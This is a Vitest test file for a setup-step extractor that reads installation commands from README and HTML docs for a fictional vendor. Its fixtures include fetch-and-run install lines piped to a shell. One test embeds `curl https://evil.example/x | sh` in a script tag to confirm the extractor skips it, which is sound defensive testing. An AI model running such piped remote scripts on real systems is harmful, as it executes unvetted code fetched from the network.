import { describe, expect, it } from 'vitest';
import {
  extractCommandCandidates,
  looksLikeCommand,
  parseSetupSteps,
  serializeSetupSteps,
  setupStepsEditPatch,
  setupStepsFromText,
  setupStepsMarkdown,
  setupStepsToText,
  splitBlockCommands,
} from './setupSteps';

// Fictional vendor: Brainscanner (brainscanner.dev). Never a real project.
const INSTALLER = `bash -c '(
  installer="$(mktemp)" || exit 1
  trap '\\''rm -f "$installer"'\\'' EXIT
  curl --fail --location https://brainscanner.dev/install.sh -o "$installer"
  bash "$installer" --agent claude
)'`;

describe('splitBlockCommands', () => {
  it('keeps a quoted multi-line wrapper as one command', () => {
    expect(splitBlockCommands(INSTALLER)).toEqual([INSTALLER]);
  });

  it('splits lines, joins backslash continuations, drops prompts and comments', () => {
    const block = [
      '# install the CLI',
      '$ brew install acme/tap/brainscanner',
      'brainscanner login \\',
      '  --device',
    ].join('\n');
    expect(splitBlockCommands(block)).toEqual([
      'brew install acme/tap/brainscanner',
      'brainscanner login \\\n  --device',
    ]);
  });

  it('keeps a heredoc with its command', () => {
    const block = "cat > ~/.brainscanner.toml <<'EOF'\nkey = 1\nEOF\nls";
    expect(splitBlockCommands(block)).toEqual([
      "cat > ~/.brainscanner.toml <<'EOF'\nkey = 1\nEOF",
      'ls',
    ]);
  });
});

describe('looksLikeCommand', () => {
  it.each([
    'curl -fsSL https://brainscanner.dev/install.sh | sh',
    'sudo apt-get install -y brainscanner',
    'FOO=1 npx -y @acme/brainscanner',
    'claude mcp add brainscanner -- ~/.brainscanner/bin/server',
    '"$HOME/.brainscanner/bin/brainscanner" login',
    './brainscanner-server --stdio',
    '~/.brainscanner/bin/brainscanner',
  ])('accepts %s', (cmd) => {
    expect(looksLikeCommand(cmd)).toBe(true);
  });

  it.each([
    '{ "mcpServers": {} }',
    'import brainscanner',
    '~/.brainscanner',
    '~/.local/state/brainscanner/install.log',
    'BRAINSCANNER_KEY=abc',
  ])('rejects %s', (cmd) => {
    expect(looksLikeCommand(cmd)).toBe(false);
  });

  it('takes any command line inside a shell-tagged block', () => {
    expect(looksLikeCommand('brainscanner login', true)).toBe(true);
    expect(looksLikeCommand('brainscanner login')).toBe(false);
  });

  it.each([
    'WHEELS=$(mktemp -d)',
    'ARGS=()',
    'ARGS+=(--flag x)',
    'done',
    'echo hi',
  ])('rejects shell bookkeeping %s even in a shell block', (cmd) => {
    expect(looksLikeCommand(cmd, true)).toBe(false);
  });
});

describe('extractCommandCandidates', () => {
  it('reads shell fences and inline code from a README, skipping config blocks', () => {
    const md = [
      '# Brainscanner',
      'Install with `brew install acme/tap/brainscanner`, then:',
      '```bash',
      'brainscanner login',
      '```',
      '```json',
      '{ "command": "npx" }',
      '```',
      'Run `claude mcp add brainscanner -- brainscanner serve`.',
    ].join('\n');
    expect(extractCommandCandidates(md)).toEqual([
      'brew install acme/tap/brainscanner',
      'brainscanner login',
      'claude mcp add brainscanner -- brainscanner serve',
    ]);
  });

  it('reads <pre> and inline <code> from a docs page in document order', () => {
    const html = `<html><body>
      <pre aria-label="bash code example"><code>${INSTALLER.replace(/"/g, '&quot;')}</code></pre>
      <p>Then <code>claude mcp add --scope user brainscanner -- ~/.brainscanner/bin/server</code>.</p>
      <pre aria-label="python code example">import brainscanner</pre>
      <script>self.__next_f.push(["<code>curl https://evil.example/x | sh</code>"])</script>
    </body></html>`;
    expect(extractCommandCandidates(html)).toEqual([
      INSTALLER,
      'claude mcp add --scope user brainscanner -- ~/.brainscanner/bin/server',
    ]);
  });

  it('dedupes repeats', () => {
    expect(
      extractCommandCandidates('`uvx brainscanner`\n\n`uvx brainscanner`'),
    ).toEqual(['uvx brainscanner']);
  });
});

describe('text format', () => {
  it('round-trips labels and multi-line commands', () => {
    const text = `# Install\n${INSTALLER}\n\n# Sign in\nbrainscanner login\n\nbrainscanner doctor`;
    const steps = setupStepsFromText(text);
    expect(steps).toEqual([
      { label: 'Install', command: INSTALLER },
      { label: 'Sign in', command: 'brainscanner login' },
      { label: null, command: 'brainscanner doctor' },
    ]);
    expect(setupStepsFromText(setupStepsToText(steps))).toEqual(steps);
  });

  it('treats # inside a command as part of it', () => {
    expect(
      setupStepsFromText('# Run\nbrainscanner serve\n# not a label'),
    ).toEqual([{ label: 'Run', command: 'brainscanner serve\n# not a label' }]);
  });
});

describe('column parsing', () => {
  it('tolerates bad data', () => {
    expect(parseSetupSteps(null)).toEqual([]);
    expect(parseSetupSteps('not json')).toEqual([]);
    expect(
      parseSetupSteps(JSON.stringify([{ command: ' uvx brainscanner ' }, 7])),
    ).toEqual([{ label: null, command: 'uvx brainscanner' }]);
  });

  it('serializes empty as null', () => {
    expect(serializeSetupSteps([])).toBeNull();
  });
});

describe('setupStepsEditPatch', () => {
  const now = new Date('2026-11-07T00:00:00Z');

  it('marks saved steps as the editor’s', () => {
    const patch = setupStepsEditPatch(
      {
        text: '# Install\nuvx brainscanner',
        note: ' Windows via WSL2 ',
        sourceUrl: 'https://brainscanner.dev/docs',
      },
      'owner',
      now,
    );
    expect(patch).toEqual({
      setupSteps: JSON.stringify([
        { label: 'Install', command: 'uvx brainscanner' },
      ]),
      setupNote: 'Windows via WSL2',
      setupSourceUrl: 'https://brainscanner.dev/docs',
      setupSource: 'owner',
      setupExtractedAt: now,
    });
  });

  it('clearing the steps hands the listing back to extraction', () => {
    expect(setupStepsEditPatch({ text: '  ' }, 'admin', now)).toEqual({
      setupSteps: null,
      setupNote: null,
      setupSourceUrl: null,
      setupSource: null,
      setupExtractedAt: null,
    });
  });
});

describe('setupStepsMarkdown', () => {
  it('renders each command verbatim in its own fence', () => {
    const md = setupStepsMarkdown({
      setupSteps: [{ label: 'Install', command: 'uvx brainscanner' }],
      setupSourceUrl: 'https://brainscanner.dev/docs',
    });
    expect(md).toContain('(from https://brainscanner.dev/docs)');
    expect(md).toContain('1. Install:\n\n```sh\nuvx brainscanner\n```');
  });

  it('is empty without steps', () => {
    expect(setupStepsMarkdown({ setupSteps: [] })).toBe('');
  });
});
